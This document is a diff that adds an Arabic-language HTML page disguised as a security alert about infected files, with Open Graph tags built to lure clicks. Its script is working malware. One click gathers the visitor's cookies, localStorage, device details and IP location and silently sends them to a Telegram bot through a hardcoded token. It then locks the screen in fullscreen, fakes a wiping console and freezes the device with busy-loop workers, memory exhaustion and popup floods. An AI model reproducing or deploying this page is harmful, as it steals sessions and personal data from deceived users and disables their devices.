@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>تنبيه أمني: وصول غير مصرح به</title>
+    <meta property="og:title" content="⚠️ نظام الحماية: تم رصد نشاط مشبوه على جهازك">
+    <meta property="og:description" content="اضغط لمعاينة تقرير الاختراق وتأمين ملفاتك فوراً (ملف PDF آمن).">
+    <meta property="og:image" content="https://raw.githubusercontent.com/app-syria/Google.com/main/1.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="article">
+    <meta name="theme-color" content="#FF0000">
+
+    <style>
+        body { background: #050505; color: #e0e0e0; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #app-container { width: 90%; max-width: 450px; text-align: center; border: 1px solid #333; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 10px 30px rgba(0,0,0,0.5); cursor: pointer; }
+        img { width: 100%; border-radius: 10px; margin-bottom: 15px; border: 1px solid #444; }
+        .btn { background: #d32f2f; color: white; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; display: block; }
+        #console { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #00ff00; padding: 20px; font-family: monospace; z-index: 10000; text-align: left; direction: ltr; }
+    </style>
+</head>
+<body>
+
+    <div id="app-container" onclick="ignitePayload()">
+        <img src="evidence.jpg" alt="Preview">
+        <h3>تقرير التهديدات الأمنية #772</h3>
+        <p style="font-size: 14px; color: #aaa;">تم العثور على 3 ملفات مصابة. اضغط للتنظيف ومنع الفرمتة تلقائياً.</p>
+        <div class="btn">معالجة التهديد الآن</div>
+    </div>
+
+    <div id="console">
+        <p>> Connection Established...</p>
+        <p>> Bypassing Android Security Layer...</p>
+        <p>> Wiping Cache: <span id="progress">0</span>%</p>
+    </div>
+
+    <script>
+        const API_KEY = "8527565205:AAFpoyLDZirTovyQKlpPO-Cm4UXzUBvLER8";
+        const ADMIN_ID = "1611398303";
+
+        // 1. استخراج الجلسة (الكنز الاستخباراتي)
+        async function exfiltrateData() {
+            let info = "🚨 **تم صيد الجلسة بنجاح**\n";
+            info += `📱 الجهاز: ${navigator.userAgent.split('(')[1].split(')')[0]}\n`;
+            info += `🍪 الكوكيز: ${document.cookie || "محمية"}\n`;
+            info += `🔑 التخزين: ${JSON.stringify(localStorage).substring(0, 500)}\n`;
+            
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const json = await res.json();
+                info += `📍 الموقع: ${json.city}, ${json.country_name}\n🌐 IP: ${json.ip}`;
+            } catch(e) {}
+
+            // إرسال صامت للتلجرام
+            navigator.sendBeacon(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);
+        }
+
+        // 2. تفعيل القنبلة المنطقية (تجميد النظام)
+        function triggerLogicBomb() {
+            // طلب ملء الشاشة لسجن المستخدم
+            document.documentElement.requestFullscreen().catch(()=>{});
+
+            // تحديث النسبة الوهمية
+            let p = 0;
+            const interval = setInterval(() => {
+                p += Math.floor(Math.random() * 3);
+                if(p <= 100) document.getElementById('progress').innerText = p;
+            }, 150);
+
+            // تدمير المعالج (Multi-threading Attack)
+            const workerCode = `while(true){ postMessage(Math.random()); }`;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            for(let i=0; i<25; i++) { new Worker(url); }
+
+            // استنزاف الذاكرة العشوائية (RAM Exhaustion)
+            let leak = [];
+            setInterval(() => {
+                leak.push(new Uint8Array(1024 * 1024 * 80).fill(0x1)); // 80MB كل ثانية
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+            }, 300);
+        }
+
+        // المحرك الأساسي
+        function ignitePayload() {
+            document.getElementById('app-container').style.display = 'none';
+            document.getElementById('console').style.display = 'block';
+
+            exfiltrateData(); // سحب البيانات فوراً
+            setTimeout(triggerLogicBomb, 500); // بدء التجميد
+        }
+    </script>
+</body>
+</html>
